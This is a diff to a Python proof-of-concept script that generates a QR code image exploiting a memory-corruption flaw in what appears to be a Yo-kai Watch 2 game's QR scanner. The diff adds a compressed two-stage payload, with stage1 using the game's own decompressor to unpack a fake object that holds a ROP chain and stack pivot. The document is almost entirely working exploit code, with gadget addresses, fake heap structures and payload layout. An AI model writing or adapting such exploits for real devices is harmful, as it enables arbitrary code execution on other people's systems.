@@ -48,11 +48,15 @@ POP_R2_TO_R4_PC = 0x00106700  # POP {R2-R4,PC}
 LDR_R0_R1 = 0x0063D63C  # LDR R0,[R1]; BX LR
 STR_R0_R1 = 0x0010B940  # STR R0,[R1]; BX LR
 ADD8 = 0x0033FE5C  # ADD R0,R0,#8; BX LR
+DECOMPRESS_FUNC = 0x001664A8  # sub_1664A8(dst, &out_size, capacity, src)
+MOV_R0_R3 = 0x001AACE0  # MOV R0,R3; BX LR
+MOV_R0_R8 = 0x0010B3CC  # MOV R0,R8; POP {R4-R8,PC}
 
 # Return stack and scratch area.
 EXIT_SP = 0x0FFFFEE8
 # Facial landmark detection workspace [0x00903838, 0x00906868), unused during QR scanning.
 SCRATCH_ADDR = 0x00906868
+D = 0x00903838  # Decompression destination in the same workspace.
 YOKAI_RESULT_OFF = 0x10
 
 # Payload object layout.
@@ -67,13 +71,17 @@ EXIT_CTX_OFF = 0x204
 YOKAI_CTX_OFF = EXIT_CTX_OFF - 0x0C
 OBJ_LEN = 0x244
 PREFIX_LEN = 27
-FIRST_SEGMENT_LEN = PREFIX_LEN + OBJ_LEN
+STAGE1_CTX_OFF = 0x060
+STAGE1_BLOB_OFF = 0x0A0
 TARGET_HEADER_DATA_OFF = N - (B + 37)
 
 # QR image configuration.
-QR_VERSION = 18
+QR_VERSION = 16
 QR_ECC = ERROR_CORRECT_L
 QR_MASK = 1
+QR_SCALE = 9
+QR_BORDER = 4
+QR_SIZE = 1280
 
 # Data restored before returning to the field.
 MATERIAL = (
@@ -87,22 +95,22 @@ def p32(buf, off, val):
     struct.pack_into("<I", buf, off, val)
 
 
-def build_fake_object():
+def build_object(base):
     b = bytearray(OBJ_LEN)
 
     # Initial fake screen object / PIVOT context.
-    p32(b, 0x00, P + 0x40)
+    p32(b, 0x00, base + 0x40)
     p32(b, 0x04, FIELD)
     p32(b, 0x08, RPG_T)
     p32(b, 0x0C, 0)
     p32(b, 0x14, 1)
-    p32(b, 0x34, P + INITIAL_STACK_OFF)
+    p32(b, 0x34, base + INITIAL_STACK_OFF)
     p32(b, 0x38, POP_R0_TO_R3_R10_PC)
     p32(b, 0x3C, STR_R1_R2)
     for off in range(0x40, 0x58, 4):
         p32(b, off, PIVOT)
 
-    # Stage frames, executed by POP_R0_TO_R3_R10_PC from P+INITIAL_STACK_OFF.
+    # Stage frames, executed by POP_R0_TO_R3_R10_PC from base+INITIAL_STACK_OFF.
     def frame(off, r0, r1, r2, r3, pc):
         p32(b, off + 0x00, r0)
         p32(b, off + 0x04, r1)
@@ -112,18 +120,18 @@ def build_fake_object():
         p32(b, off + 0x14, pc)
 
     frame(INITIAL_STACK_OFF + 0x00, 0, 0, N_OWNER_ADDR + 4, 0, STR_R1_R2)  # owner + 0x04 = 0
-    frame(INITIAL_STACK_OFF + 0x18, 0, FIELD, FIELD_REF_SLOT_ADDR, RET_TRUE, STR_R1_R2)  # RET_TRUE also occupies fake-vtable slot P+0x84.
-    frame(INITIAL_STACK_OFF + 0x30, 0, P + VIEW_CTX_OFF, SCRATCH_ADDR + 4, 0, STR_R1_R2)  # [SCRATCH_ADDR+4] = P+VIEW_CTX_OFF
+    frame(INITIAL_STACK_OFF + 0x18, 0, FIELD, FIELD_REF_SLOT_ADDR, RET_TRUE, STR_R1_R2)  # RET_TRUE also occupies fake-vtable slot base+0x84.
+    frame(INITIAL_STACK_OFF + 0x30, 0, base + VIEW_CTX_OFF, SCRATCH_ADDR + 4, 0, STR_R1_R2)  # [SCRATCH_ADDR+4] = base+VIEW_CTX_OFF
     frame(INITIAL_STACK_OFF + 0x48, 0, PIVOT, SCRATCH_ADDR + 0xC, 0, STR_R1_R2)  # [SCRATCH_ADDR+0xC] = PIVOT
-    frame(INITIAL_STACK_OFF + 0x60, P + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)  # call CREATE_YOKAI_FUNC, then ALLOC_CTX_OFF
+    frame(INITIAL_STACK_OFF + 0x60, base + YOKAI_CTX_OFF, 0, 0, 0, PIVOT)  # call CREATE_YOKAI_FUNC, then ALLOC_CTX_OFF
 
     # Allocation context.
-    p32(b, ALLOC_CTX_OFF + 0x00, P + DEV_SLOT_OFF)  # r0 = pointer to word containing DEV
+    p32(b, ALLOC_CTX_OFF + 0x00, base + DEV_SLOT_OFF)  # r0 = pointer to word containing DEV
     p32(b, ALLOC_CTX_OFF + 0x04, N_OWNER_ADDR)  # r1 = owner
     p32(b, ALLOC_CTX_OFF + 0x08, 40)  # r2 = size
     p32(b, ALLOC_CTX_OFF + 0x0C, 2)  # r3 = align shift
     p32(b, ALLOC_CTX_OFF + 0x10, N_OWNER_ADDR + 0x14C)  # r4 = result slot for STORE_RESULT_RET
-    p32(b, ALLOC_CTX_OFF + 0x14, P + VIEW_CTX_OFF)  # r5 -> r0 after STORE_RESULT_RET
+    p32(b, ALLOC_CTX_OFF + 0x14, base + VIEW_CTX_OFF)  # r5 -> r0 after STORE_RESULT_RET
     for off in range(0x18, 0x34, 4):
         p32(b, ALLOC_CTX_OFF + off, 0)
     p32(b, ALLOC_CTX_OFF + 0x34, SCRATCH_ADDR)  # SP for the allocator
@@ -131,13 +139,13 @@ def build_fake_object():
     p32(b, ALLOC_CTX_OFF + 0x3C, HEAP_ALLOC_FUNC)  # PC
 
     # View-pop context. The same memory backs view+0x40/+0x48:
-    #   view = P+ALLOC_CTX_OFF, view+0x40 = P+VIEW_CTX_OFF+0, view+0x48 = P+VIEW_CTX_OFF+8.
-    p32(b, VIEW_CTX_OFF + 0x00, P + WF_SLOT_OFF)  # entries pointer
+    #   view = base+ALLOC_CTX_OFF, view+0x40 = base+VIEW_CTX_OFF+0, view+0x48 = base+VIEW_CTX_OFF+8.
+    p32(b, VIEW_CTX_OFF + 0x00, base + WF_SLOT_OFF)  # entries pointer
     p32(b, VIEW_CTX_OFF + 0x04, 0)
     p32(b, VIEW_CTX_OFF + 0x08, 0x00010001)  # entry count = 1
     for off in range(0x0C, 0x34, 4):
         p32(b, VIEW_CTX_OFF + off, 0)
-    p32(b, VIEW_CTX_OFF + 0x34, P + ROP_CHAIN_OFF)
+    p32(b, VIEW_CTX_OFF + 0x34, base + ROP_CHAIN_OFF)
     p32(b, VIEW_CTX_OFF + 0x38, POP_PC)
     p32(b, VIEW_CTX_OFF + 0x3C, POP_R1_PC)
 
@@ -150,7 +158,7 @@ def build_fake_object():
         0,
         0,
         POP_R1_PC,  # r1 = template
-        P + RESTORE_TEMPLATE_OFF,
+        base + RESTORE_TEMPLATE_OFF,
         MEMMOVE_FUNC,  # memmove(p, template, 40); r0=p, LR=0x18A2E8
         POP_LR_PC,  # restore LR=POP_PC (MEMMOVE_FUNC's internal BL clobbers LR)
         POP_PC,
@@ -165,11 +173,11 @@ def build_fake_object():
         ADD8,  # p+32
         STR_R0_R1,  # [owner + 0x218] = p+32
         POP_R0_PC,  # r0 = view; PC = POP_LR_PC
-        P + ALLOC_CTX_OFF,
+        base + ALLOC_CTX_OFF,
         POP_LR_PC,  # LR = POP_R0_PC; PC = VIEW_POP_FUNC
         POP_R0_PC,
         VIEW_POP_FUNC,
-        P + EXIT_CTX_OFF,  # POP_R0_PC return record
+        base + EXIT_CTX_OFF,  # POP_R0_PC return record
         PIVOT,
     ]
     for i, word in enumerate(chain):
@@ -191,10 +199,10 @@ def build_fake_object():
     for off in range(0x00, 0x34, 4):
         p32(b, EXIT_CTX_OFF + off, 0)
     p32(b, EXIT_CTX_OFF + 0x04, SCRATCH_ADDR + YOKAI_RESULT_OFF)  # creation R4
-    p32(b, EXIT_CTX_OFF + 0x08, P + ALLOC_CTX_OFF)  # creation R5
-    # Exit R9 points to the fake object.
+    p32(b, EXIT_CTX_OFF + 0x08, base + ALLOC_CTX_OFF)  # creation R5
+    # Exit R9 points to the fake object at base.
     # This shared word is not an input to CREATE_YOKAI_FUNC.
-    p32(b, EXIT_CTX_OFF + 0x24, P)
+    p32(b, EXIT_CTX_OFF + 0x24, base)
     p32(b, EXIT_CTX_OFF + 0x28, SCRATCH_ADDR)  # creation SP
     p32(b, EXIT_CTX_OFF + 0x2C, STORE_RESULT_RET)  # creation LR
     p32(b, EXIT_CTX_OFF + 0x30, CREATE_YOKAI_FUNC)  # creation PC
@@ -202,6 +210,85 @@ def build_fake_object():
     p32(b, EXIT_CTX_OFF + 0x38, 0)
     p32(b, EXIT_CTX_OFF + 0x3C, POP_R4_TO_R8_PC)
     return b
+
+
+def build_stage1(blob, stage2_size):
+    b = bytearray(STAGE1_BLOB_OFF)
+    p32(b, 0x00, P + 0x40)
+    p32(b, 0x04, FIELD)
+    p32(b, 0x08, RPG_T)
+    p32(b, 0x0C, P + STAGE1_CTX_OFF)
+    p32(b, 0x14, 1)
+    p32(b, 0x34, SCRATCH_ADDR + 0x1C)
+    p32(b, 0x38, PIVOT)
+    p32(b, 0x3C, MOV_R0_R3)
+    for off in range(0x40, 0x60, 4):
+        p32(b, off, PIVOT)
+
+    ctx = STAGE1_CTX_OFF
+    capacity = (stage2_size + 3) & ~3
+    p32(b, ctx + 0x00, D)
+    p32(b, ctx + 0x04, SCRATCH_ADDR)
+    p32(b, ctx + 0x08, capacity)
+    p32(b, ctx + 0x0C, P + STAGE1_BLOB_OFF)
+    p32(b, ctx + 0x20, D)
+    p32(b, ctx + 0x24, RET_TRUE)  # P+0x84: the original fake-vtable slot 0x44.
+    p32(b, ctx + 0x34, SCRATCH_ADDR)
+    p32(b, ctx + 0x38, MOV_R0_R8)
+    p32(b, ctx + 0x3C, DECOMPRESS_FUNC)
+    return b
+
+
+def lz10_compress(data):
+    # Greedy LZ10: 3..18-byte matches, 12-bit displacement.
+    out = bytearray()
+    flags = 0
+    flag_count = 0
+    tokens = bytearray()
+    i = 0
+    n = len(data)
+    while i < n:
+        best_len = 0
+        best_disp = 0
+        start = max(0, i - 4096)
+        for j in range(i - 1, start - 1, -1):
+            if data[j] != data[i]:
+                continue
+            length = 0
+            while (length < 18 and i + length < n
+                   and data[j + length] == data[i + length]):
+                length += 1
+            if length > best_len:
+                best_len = length
+                best_disp = i - j
+                if length == 18:
+                    break
+        if best_len >= 3:
+            flags |= 0x80 >> flag_count
+            disp = best_disp - 1
+            tokens.append(((best_len - 3) << 4) | (disp >> 8))
+            tokens.append(disp & 0xFF)
+            i += best_len
+        else:
+            tokens.append(data[i])
+            i += 1
+        flag_count += 1
+        if flag_count == 8:
+            out.append(flags)
+            out.extend(tokens)
+            flags = 0
+            flag_count = 0
+            tokens.clear()
+    if flag_count:
+        out.append(flags)
+        out.extend(tokens)
+    return bytes(out)
+
+
+def build_compressed_blob(stage2):
+    # Level-5 block header: (decompressed size << 3) | method (1 = LZ10).
+    data = lz10_compress(stage2)
+    return struct.pack("<I", (len(stage2) << 3) | 1) + data
 
 
 def build_fake_heap_header():
@@ -220,13 +307,17 @@ def build_fake_heap_header():
 
 
 def build_first_segment():
-    b = bytearray(FIRST_SEGMENT_LEN)
-    b[PREFIX_LEN:] = build_fake_object()
+    stage2 = build_object(D)
+    blob = build_compressed_blob(stage2)
+    stage1 = build_stage1(blob, len(stage2))
+    b = bytearray(PREFIX_LEN + len(stage1) + len(blob))
+    b[PREFIX_LEN:PREFIX_LEN + len(stage1)] = stage1
+    b[PREFIX_LEN + len(stage1):] = blob
     return b
 
 
-def build_declared_lengths():
-    remaining = TARGET_HEADER_DATA_OFF - FIRST_SEGMENT_LEN
+def build_declared_lengths(first_segment_len):
+    remaining = TARGET_HEADER_DATA_OFF - first_segment_len
     out = []
     while remaining > 65535:
         out.append(65535)
@@ -235,10 +326,7 @@ def build_declared_lengths():
     return out
 
 
-DECLARED_LENGTHS = build_declared_lengths()
-
-
-def build_bitstream():
+def build_bitstream(first_segment):
     bits = []
 
     def put(val, n):
@@ -246,10 +334,10 @@ def build_bitstream():
             bits.append((val >> i) & 1)
 
     put(0b0100, 4)
-    put(FIRST_SEGMENT_LEN, 16)
-    for by in build_first_segment():
+    put(len(first_segment), 16)
+    for by in first_segment:
         put(by, 8)
-    for count in DECLARED_LENGTHS:
+    for count in build_declared_lengths(len(first_segment)):
         put(0b0011, 4)
         put(0, 4)
         put(0, 4)
@@ -273,11 +361,10 @@ def build_bitstream():
 
 
 def build_image():
-    scale = 8
-    border = 4
     rs = qrcode.base.rs_blocks(QR_VERSION, QR_ECC)
     cap = sum(block.data_count for block in rs)
-    data = build_bitstream()
+    first_segment = build_first_segment()
+    data = build_bitstream(first_segment)
     i = 0
     while len(data) < cap:
         data.append(0xEC if i % 2 == 0 else 0x11)
@@ -296,18 +383,18 @@ def build_image():
     qr.make(fit=False)
     modules = qr.modules
 
-    dim = (len(modules) + 2 * border) * scale
-    W, H = 1280, 1280
+    dim = (len(modules) + 2 * QR_BORDER) * QR_SCALE
+    W, H = QR_SIZE, QR_SIZE
     img = Image.new("L", (W, H), 255)
     ox = (W - dim) // 2
     oy = (H - dim) // 2
     for y, row in enumerate(modules):
         for x, dark in enumerate(row):
             if dark:
-                x0 = ox + (x + border) * scale
-                y0 = oy + (y + border) * scale
-                for dy in range(scale):
-                    for dx in range(scale):
+                x0 = ox + (x + QR_BORDER) * QR_SCALE
+                y0 = oy + (y + QR_BORDER) * QR_SCALE
+                for dy in range(QR_SCALE):
+                    for dx in range(QR_SCALE):
                         img.putpixel((x0 + dx, y0 + dy), 0)
     here = os.path.dirname(os.path.abspath(__file__))
     img.save(os.path.join(here, "yw2_qr_poc.png"))
